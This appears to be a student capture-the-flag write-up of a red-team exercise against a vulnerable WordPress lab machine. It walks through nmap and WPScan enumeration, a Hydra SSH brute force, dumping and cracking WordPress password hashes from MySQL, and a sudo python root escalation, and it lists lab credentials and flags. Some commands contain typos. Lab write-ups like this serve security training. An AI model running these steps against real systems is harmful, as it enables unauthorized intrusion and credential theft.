# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

The following services and OS data are revealed by the Nmap scan results for each machine:

$ nmap -A 192.168.1.0/24
- ![alt text](https://github.com/fpanes/Final-Project/blob/main/Images/Offensive/nmapscan.png)

This scan finds the following services as potential ports of entry:
- Target 1
  - Port 22/TCP Open SSH
  - Port 80/TCP Open HTTP
  - Port 111/TCP Open rcpbind
  - Port 139/TCP Open netbios-ssn
  - Port 445/TCP Open netbios-ssn

On each target, the following vulnerabilities were discovered:
- Target 1
  - Improper configured SSH
  - WordPress Enumation
  - Weak Password Implementation
  - There is no implementation of file security permission.
  - Use of weak password salted hashes
  - Python root escalation privileges

### Exploitation

The Red Team was successful in breaching 'Target 1' and obtaining the following sensitive information:
- Target 1
  - `flag1.txt`: b9bbcb33ellb80be759c4e844862482d
    - **Exploits Used**
      - WPScan is being used to count the number of users on the Target 1 WordPress site.
       - wpscan --url http://192.168.1.110 --enumerate u
       - ![alt text](https://github.com/fpanes/Final-Project/blob/main/Images/Offensive/wpscan.png)
 
    - Targeting User Michael
      - Executed Hydra Brute Force Attack
        - The following command was performed:
        - hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh
        - Password: Michael
        - ![alt text](https://github.com/fpanes/Final-Project/blob/main/Images/Offensive/bruteforcemike.png)

    - Capturing Flag 1: As Michael, I went through directories and files following an SSH Brute Force Attack.
      - Flag1 was discovered in the var/www/html folder at the root in service.html in an HTML remark below the footer.
      - Commands:
        - ssh michael@192.168.1.110
        - pw: michael
        - ![alt text](https://github.com/fpanes/Final-Project/blob/main/Images/Offensive/sshmikepass.png)
        - cd ../
        - cd /var/www/html
        - ls -l
        - nano service.html
        - ![alt text](https://github.com/fpanes/Final-Project/blob/main/Images/Offensive/flagone.png)

  - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
    - **Exploit Used**
      - Same exploit covered in flag1 to gain access
      - Commands:
        - ssh michael@192.168.1.110
        - pw: michael
        - cd ../
        - cd /var/www
        - find / i-name flag*
        - cat flag2.txt

  - `flag3` : afc01ab56b50591e7dccf93122770cd2
    - **Exploit Used**
      - Previous exploit covered in flag1 and flag2
      - Captured flag3 Accessing MySQL database
        - MySQL was used to examine the database after discovering wp-config.php and getting access to the database credentials as Michael.
        - the wp-config.php displayed DB_Password in plaintext

        - flag3 was found in wp_posts table in the wordpress database.
        - Commands:
          - Connected to mysql: -u root -p R@v3nSecurity
          - show databases;
          - use wordpress;
          - show tables;
          - select * from wp_posts;

  - `flag4` : 715dea6c055b9fe3337544932f2941ce
    - **Exploit Used**
      - Use of weak password salted hashes and Python root escalation privileges
      - Captured flag4 by collecting user credentials from the database, running john the ripper to crack the password hash, then gaining root access using Python Escalation Privileges.
        - After gaining access to the database credentials as Michael through the sp-config.phpfile, the next step was to decrypt password hashes obtained from MySQL.
        - These user credentials are saved in the WordPress database's wp_users table.
        - The usernames and password hashes were recorded in a file named wp hashes.txt on the Kali computer.
        - Commands:
          - Connected to mysql: -u root -p R@v3nSecurity
          - SELECT ID, user_login, user_pass FROM wp_users;

        - When I exported the hashes, I stored them separately as stevenhash.txt and michaelhash.txt and cracked the hashes using John the Ripper.
          - Command:
            - john stevenhash.txt
            - john michaelhash.txt; the execution of the john the ripper continued; however, we already knew the password from the prior action.

          - After cracking Steven's password hash, the next step was to SSH as Steven. Then, as Steven, use Python to check for privilege and escalate to root.
          - Command:
            - ssh steven@192.168.1.110
            - pw:pink84
            - sudo -l
            - sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
            - cd /root
            - ls
            - cat flag4.txt
